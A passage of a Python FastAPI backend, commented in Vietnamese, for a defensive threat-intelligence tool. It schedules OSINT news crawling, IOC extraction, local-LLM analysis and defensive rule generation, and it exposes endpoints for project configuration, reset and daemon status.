                rem = max(0, int(self.next_scan_time - now))
            else:
                rem = 0

            total_articles = 0
            completed_count = 0
            pending_count = 0
            try:
                db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
                if db_path.exists():
                    with sqlite3.connect(db_path) as conn:
                        total_articles = conn.execute("SELECT COUNT(*) FROM articles_archive").fetchone()[0]
                        completed_count = conn.execute("SELECT COUNT(*) FROM articles_archive WHERE status = 'completed'").fetchone()[0]
                        pending_count = conn.execute("SELECT COUNT(*) FROM articles_archive WHERE status = 'pending'").fetchone()[0]
            except Exception:
                pass

            return {
                "auto_scan_enabled": self.auto_scan_enabled,
                "scan_interval_sec": self.scan_interval_sec,
                "remaining_scan_sec": rem,
                "is_scanning": self.is_scanning,
                "last_scan_result": self.last_scan_result,
                "auto_queue_enabled": self.auto_queue_enabled,
                "is_processing_queue": self.is_processing_queue,
                "active_article_id": self.active_article_id,
                "active_article_title": self.active_article_title,
                "active_stage_idx": self.active_stage_idx,
                "active_stage_name": self.active_stage_name,
                "total_articles": total_articles,
                "completed_count": completed_count,
                "pending_count": pending_count,
                "server_uptime_sec": int(now - self.boot_time),
            }

    def update_config(self, auto_scan: Optional[bool] = None, interval_sec: Optional[int] = None, auto_queue: Optional[bool] = None):
        with self.lock:
            now = time.time()
            if auto_scan is not None:
                self.auto_scan_enabled = bool(auto_scan)
                if self.auto_scan_enabled:
                    self.next_scan_time = now + self.scan_interval_sec
            if interval_sec is not None and interval_sec >= 10:
                self.scan_interval_sec = int(interval_sec)
                self.next_scan_time = now + self.scan_interval_sec
            if auto_queue is not None:
                self.auto_queue_enabled = bool(auto_queue)

    def trigger_scan_now(self):
        with self.lock:
            self.next_scan_time = time.time()

    def start_worker(self):
        if self.thread is None or not self.thread.is_alive():
            self.thread = threading.Thread(target=self._worker_loop, daemon=True)
            self.thread.start()

    def _worker_loop(self):
        while True:
            try:
                time.sleep(1)
                now = time.time()

                # 1. Quét tự động định kỳ các nguồn báo OSINT trên server
                if self.auto_scan_enabled and not self.is_scanning:
                    if now >= self.next_scan_time:
                        self.is_scanning = True
                        self.last_scan_result = "Crawler Server: Đang tự động quét 6 nguồn OSINT quốc tế..."
                        try:
                            crawl_all_sources_and_archive(limit_per_source=8)
                            self.last_scan_result = f"Crawler Server: Hoàn tất quét lúc {datetime.now().strftime('%H:%M:%S')}"
                        except Exception as e:
                            self.last_scan_result = f"Crawler Server: Lỗi quét {e}"
                        finally:
                            self.last_scan_time = time.time()
                            self.next_scan_time = self.last_scan_time + self.scan_interval_sec
                            self.is_scanning = False

                # 2. Xử lý tuần tự bài báo trong hàng đợi SQLite (nếu bật auto_queue)
                if self.auto_queue_enabled and not self.is_processing_queue:
                    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
                    if db_path.exists():
                        with sqlite3.connect(db_path) as conn:
                            conn.row_factory = sqlite3.Row
                            pending_row = conn.execute(
                                "SELECT article_id, source_name, title, content FROM articles_archive WHERE status = 'pending' ORDER BY sort_ts DESC LIMIT 1"
                            ).fetchone()

                        if pending_row:
                            art_id = pending_row["article_id"]
                            art_title = pending_row["title"]
                            art_content = pending_row["content"]

                            self.is_processing_queue = True
                            self.active_article_id = art_id
                            self.active_article_title = art_title
                            self.active_stage_idx = 2
                            self.active_stage_name = "Bóc tách IOC & Lập kế hoạch AI"

                            t_start = time.time()
                            try:
                                update_article_analysis_status(art_id, status="processing")

                                self.active_stage_idx = 3
                                self.active_stage_name = "AI Agent bóc tách IOC & Tra cứu 5 nguồn tình báo"
                                iocs = tool6_extract_iocs_hybrid(art_content)
                                enriched = []
                                malicious = []
                                if iocs:
                                    enriched = [enrich_ioc(i, call_vt_http=False) for i in iocs]
                                    malicious = filter_high_risk_iocs(enriched)
                                    save_enriched_iocs_to_db(enriched, source_title=art_title)

                                self.active_stage_idx = 4
                                self.active_stage_name = "AI Agent suy luận phân tích (Local LLM Qwen3 trên GPU RX 6600)"
                                brain = MultiProviderLLMBrain(provider="ollama", model_name="khang-qwen3")
                                sys_prompt = (
                                    "Bạn là Tác tử AI An ninh Mạng tự chủ (Autonomous CTI Defense Agent). "
                                    "Hãy phân tích bài báo sau và tóm tắt phương án phòng thủ bằng tiếng Việt trong 3 gạch đầu dòng: "
                                    "1. Bản chất cuộc tấn công, nhóm APT hoặc loại mã độc/lỗ hổng. "
                                    "2. Các chỉ số IoC/CVE trọng yếu cần chặn. "
                                    "3. Quy tắc phòng thủ đề xuất (WAF/Suricata/Firewall)."
                                )
                                user_prompt = f"Tiêu đề: {art_title}\n\nNội dung:\n{art_content[:1500]}"
                                try:
                                    llm_out = brain.ask_llm(sys_prompt, user_prompt, temperature=0.1)
                                    ai_summary = llm_out.get("content", "").strip()
                                except Exception as err:
                                    ai_summary = f"Tác tử phân tích tự động: {err}"

                                mitre = tool7_map_mitre_attack(art_content, malicious)
                                base_rules = tool8_generate_defensive_rules(art_title, malicious, mitre, raw_text=art_content)
                                save_ai_analysis_run_to_db(
                                    run_mode="SERVER_AUTONOMOUS_DAEMON",
                                    campaign_title=f"[{pending_row['source_name']}] {art_title[:100]}",
                                    model_used="LOCAL OLLAMA (khang-qwen3 • 100% GPU RX 6600)",
                                    total_iocs=len(enriched),
                                    malicious_iocs=len(malicious),
                                    defense_summary=ai_summary or f"Tác tử AI tự động phân tích và sinh Kỹ Năng Tác Tử cho {len(malicious)} IOC.",
                                )

                                duration = round(time.time() - t_start, 2)
                                update_article_analysis_status(art_id, status="completed", processing_time_sec=duration)
                                try:
                                    live_orchestrator.compile_and_sync_all_defense_engines(trigger_source=f"DAEMON_WORKER: {art_title[:35]}")
                                except Exception:
                                    pass
                            except Exception as e:
                                duration = round(time.time() - t_start, 2)
                                update_article_analysis_status(art_id, status="completed", processing_time_sec=duration)
                            finally:
                                self.is_processing_queue = False
                                self.active_article_id = ""
                                self.active_article_title = ""
                                self.active_stage_idx = 0
                                self.active_stage_name = ""

            except Exception:
                time.sleep(2)


server_daemon = ServerAutonomousDaemon()



class TargetRequest(BaseModel):
    target_path: str = ""

@app.get("/api/system/project-context")
def api_get_project_context(target: str = Query("")):
    global ACTIVE_TARGET_PROJECT
    raw = target.strip() or ACTIVE_TARGET_PROJECT or ""
    
    if not raw:
        last_cfg = SANDBOX_DIR / "last_active_project.json"
        if last_cfg.exists():
            try:
                ld = json.loads(last_cfg.read_text(encoding="utf-8"))
                if ld.get("target_path") and Path(ld["target_path"]).exists():
                    raw = ld["target_path"]
            except Exception:
                pass
    if not raw:
        cand_cti = Path("D:/mkhang/testCTI")
        if cand_cti.exists():
            raw = str(cand_cti.resolve())
        else:
            raw = str(Path.cwd())

    p = Path(raw).resolve()
    if not p.exists():
        p = (Path(__file__).resolve().parents[1] / "target_projects" / "My_Website").resolve()
    
    ACTIVE_TARGET_PROJECT = str(p)
    cfg_file = p / ".cti_defense.json"
    is_configured = False
    cfg_data = {}
    
    # 1. Check direct .cti_defense.json on disk
    if cfg_file.exists():
        try:
            cfg_data = json.loads(cfg_file.read_text(encoding="utf-8"))
            if cfg_data.get("status") in ("PROTECTED", "ACTIVE", "CONFIGURED") or cfg_data.get("skill_name"):
                is_configured = True
        except Exception:
            pass
            
    # 2. Check SQLite persistent project_defense_registry
    if not is_configured:
        try:
            db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
            if db_path.exists():
                with sqlite3.connect(db_path) as conn:
                    conn.row_factory = sqlite3.Row
                    row = conn.execute("SELECT * FROM project_defense_registry WHERE target_path = ?", (str(p),)).fetchone()
                    if row and row["is_configured"]:
                        is_configured = True
                        cfg_data = {
                            "project_name": row["target_name"] or p.name,
                            "project_path": row["target_path"] or str(p),
                            "scope_id": row["scope_id"] or "SCOPE_WEB",
                            "scope_name": row["scope_name"] or "Phân hệ Web & API (Lớp Ứng Dụng)",
                            "skill_name": row["skill_name"] or "agentic-defense-master-web-suite",
                            "scan_interval_sec": row["scan_interval_sec"] or 21600,
                            "configured_at": row["configured_at"] or datetime.now().isoformat(),
                            "status": "PROTECTED"
                        }
        except Exception:
            pass

    # 3. Check last_active_project.json
    if not is_configured:
        try:
            lap = SANDBOX_DIR / "last_active_project.json"
            if lap.exists():
                ld = json.loads(lap.read_text(encoding="utf-8"))
                if ld.get("target_path") == str(p) and ld.get("is_configured"):
                    is_configured = True
                    cfg_data = {
                        "project_name": ld.get("target_name", p.name),
                        "project_path": str(p),
                        "scope_id": ld.get("scope_id", "SCOPE_WEB"),
                        "scope_name": ld.get("scope_name", "Phân hệ Web & API (Lớp Ứng Dụng)"),
                        "skill_name": ld.get("skill_name", "agentic-defense-master-web-suite"),
                        "scan_interval_sec": ld.get("scan_interval_sec", 21600),
                        "configured_at": ld.get("configured_at", datetime.now().isoformat()),
                        "status": "PROTECTED"
                    }
        except Exception:
            pass

    # 4. Check directory signatures (chỉ tính khi có đủ defense_skills VÀ AGENT_REMEDIATION_GUIDE.md)
    if not is_configured:
        ds_dir = p / "defense_skills"
        has_skills = ds_dir.exists() and any(d.is_dir() for d in ds_dir.iterdir())
        has_guide = (p / "AGENT_REMEDIATION_GUIDE.md").exists()
        has_cti_cfg = (p / ".cti_defense.json").exists()
        
        if (has_skills and has_guide) or has_cti_cfg:
            found_skill = "agentic-defense-master-web-suite"
            if has_skills:
                subdirs = [d.name for d in ds_dir.iterdir() if d.is_dir()]
                if subdirs:
                    found_skill = subdirs[0]
            
            scope_id = "SCOPE_WEB"
            scope_name = "Scope A: Web & API Layer"
            manifest_file = ds_dir / found_skill / "manifest.json"
            if manifest_file.exists():
                try:
                    mdata = json.loads(manifest_file.read_text(encoding="utf-8"))
                    scope_id = mdata.get("scope_id", scope_id)
                    scope_name = mdata.get("scope_name", scope_name)
                except Exception:
                    pass
            
            cfg_data = {
                "project_name": p.name,
                "project_path": str(p),
                "scope_id": scope_id,
                "scope_name": scope_name,
                "skill_name": found_skill,
                "scan_interval_sec": server_daemon.scan_interval_sec or 21600,
                "configured_at": datetime.now().isoformat(),
                "status": "PROTECTED"
            }
            is_configured = True

    # Đồng bộ lưu lại nếu đã bảo vệ
    if is_configured and cfg_data:
        saved_sec = cfg_data.get("scan_interval_sec") or 21600
        if int(saved_sec) >= 10:
            server_daemon.update_config(interval_sec=int(saved_sec))
        record_project_configuration(
            target_path=p,
            scope_id=cfg_data.get("scope_id", "SCOPE_WEB"),
            scope_name=cfg_data.get("scope_name", "Scope A: Web & API Layer"),
            skill_name=cfg_data.get("skill_name", "agentic-defense-master-web-suite"),
            scan_interval_sec=int(saved_sec)
        )
            
    return {
        "target_path": str(p),
        "target_name": p.name,
        "is_configured": is_configured,
        "config": cfg_data
    }

@app.post("/api/system/set-target")
def api_set_target(req: TargetRequest):
    global ACTIVE_TARGET_PROJECT
    t = req.target_path.strip()
    if t:
        ACTIVE_TARGET_PROJECT = t
    return api_get_project_context(ACTIVE_TARGET_PROJECT)

@app.post("/api/system/project-reset")
def api_reset_project(req: TargetRequest):
    import shutil
    t = req.target_path.strip() or ACTIVE_TARGET_PROJECT
    p = Path(t).resolve()
    
    # 1. Cập nhật SQLite project_defense_registry
    try:
        db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
        if db_path.exists():
            with sqlite3.connect(db_path) as conn:
                conn.execute("UPDATE project_defense_registry SET is_configured = 0 WHERE target_path = ?", (str(p),))
                conn.execute("UPDATE articles_archive SET status = 'pending', processing_time_sec = 0, last_analyzed_at = NULL")
                conn.execute("DELETE FROM ioc_knowledge_base")
                conn.execute("DELETE FROM ai_analysis_runs")
                conn.commit()
    except Exception:
        pass

    # 2. Xóa hẳn last_active_project.json để đưa hệ thống về Landing Wizard ban đầu
    try:
        lap = SANDBOX_DIR / "last_active_project.json"
        if lap.exists():
            lap.unlink(missing_ok=True)
    except Exception:
        pass
    
    cfg_file = p / ".cti_defense.json"
    if cfg_file.exists():
        try:
            cfg_file.unlink()
        except Exception:
            pass
            
    ds_dir = p / "defense_skills"
    if ds_dir.exists():
        try:
            shutil.rmtree(ds_dir, ignore_errors=True)
        except Exception:
            pass
            
    guide_file = p / "AGENT_REMEDIATION_GUIDE.md"
    if guide_file.exists():
        try:
            guide_file.unlink()
        except Exception:
            pass
            
    for root_extra in [p / ".cursor" / "rules", p / ".gemini" / "skills"]:
        if root_extra.exists():
            for item in root_extra.glob("agentic-defense-*"):
                try:
                    if item.is_dir():
                        shutil.rmtree(item, ignore_errors=True)
                    else:
                        item.unlink()
                except Exception:
                    pass

    return {"status": "success", "message": f"Đã đặt lại cấu hình phòng thủ cho {p.name}. Sẵn sàng quét lại từ đầu."}

@app.get("/api/system/hardware-info")
def api_get_hardware_info():
    """Tự động nhận diện GPU/CPU và các Model Ollama thực tế có trên máy người dùng."""
    return get_adaptive_system_profile()

@app.get("/static/so_do_luong_do_an_chuan.html")
def view_so_do_html():
    from fastapi.responses import HTMLResponse
    p = os.path.join(os.path.dirname(__file__), "so_do_luong_do_an_chuan.html")
    if os.path.exists(p):
        with open(p, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    return HTMLResponse("<h1>Không tìm thấy tệp sơ đồ</h1>", status_code=404)

@app.get("/static/so_do_luong_do_an_chuan.svg")
def view_so_do_svg():
    from fastapi.responses import Response
    p = os.path.join(os.path.dirname(__file__), "so_do_luong_do_an_chuan.svg")
    if os.path.exists(p):
        with open(p, "r", encoding="utf-8") as f:
            return Response(content=f.read(), media_type="image/svg+xml")
    return Response("Not found", status_code=404)

@app.get("/api/system/daemon-status")
def api_get_daemon_status():
    return server_daemon.get_status()


@app.post("/api/system/daemon-config")
def api_update_daemon_config(req: DaemonConfigRequest):
    server_daemon.update_config(
        auto_scan=req.auto_scan_enabled,
        interval_sec=req.scan_interval_sec,
        auto_queue=req.auto_queue_enabled,
    )
    global ACTIVE_TARGET_PROJECT
    target_to_update = ACTIVE_TARGET_PROJECT
    if target_to_update:
        try:
            cfg_p = Path(target_to_update) / ".cti_defense.json"
            if cfg_p.exists():
                c_data = json.loads(cfg_p.read_text(encoding="utf-8"))
                if req.scan_interval_sec is not None:
                    c_data["scan_interval_sec"] = int(req.scan_interval_sec)
                if req.auto_scan_enabled is not None:
                    c_data["auto_scan_enabled"] = bool(req.auto_scan_enabled)
                if req.auto_queue_enabled is not None:
                    c_data["auto_queue_enabled"] = bool(req.auto_queue_enabled)
                cfg_p.write_text(json.dumps(c_data, indent=2, ensure_ascii=False), encoding="utf-8")
        except Exception:
            pass
    return server_daemon.get_status()



@app.get("/api/system/gap-status")
def api_get_gap_status():
    """Kiểm tra khoảng trống thời gian tắt máy và mốc bài báo mới nhất."""
    return get_cti_gap_status()

@app.post("/api/system/catch-up-crawl")
def api_catch_up_crawl(since_date: Optional[str] = Query(None)):
    """Kích hoạt cào bù toàn bộ các bài báo an ninh mạng phát sinh trong lúc tắt máy."""
    res = crawl_gap_catchup_archive(since_date=since_date)
    # Kích hoạt tác tử AI phân tích ngay các bài mới trong hàng đợi
    server_daemon.trigger_scan_now()
    return res

@app.post("/api/system/trigger-scan")
def api_trigger_scan():
    server_daemon.trigger_scan_now()
    return server_daemon.get_status()


@app.on_event("startup")
def _start_247_daemon_on_boot() -> None:
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    if db_path.exists():
        with sqlite3.connect(db_path) as conn:
            conn.execute("UPDATE articles_archive SET status = 'pending' WHERE status = 'processing'")
            conn.commit()

    try:
        live_orchestrator.compile_and_sync_all_defense_engines()
        live_orchestrator.start_live_waf_proxy()
    except Exception as e:
        print(f"[STARTUP] Lỗi khởi động live orchestrator: {e}")

    server_daemon.start_worker()

    # Tự động phát hiện khoảng trống thời gian tắt máy và cào bù ngầm khi khởi động
    def _auto_gap_catchup_worker():
        time.sleep(3)
        try:
            gap_info = get_cti_gap_status()
            if gap_info.get("gap_hours", 0) >= 3.0:
                print(f"[AUTO-CATCHUP] Phát hiện khoảng trống tắt máy: {gap_info.get('gap_description')} (từ {gap_info.get('suggested_since_date')}). Đang tự động cào bù...")
                res = crawl_gap_catchup_archive()
                print(f"[AUTO-CATCHUP] Hoàn tất cào bù ngầm: Đã nạp {res.get('newly_added_count', 0)} bài báo mới vào hàng đợi.")
                server_daemon.trigger_scan_now()
        except Exception as e:
            print(f"[AUTO-CATCHUP] Lỗi cào bù tự động: {e}")

    threading.Thread(target=_auto_gap_catchup_worker, daemon=True, name="AutoGapCatchupWorker").start()


if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8765)

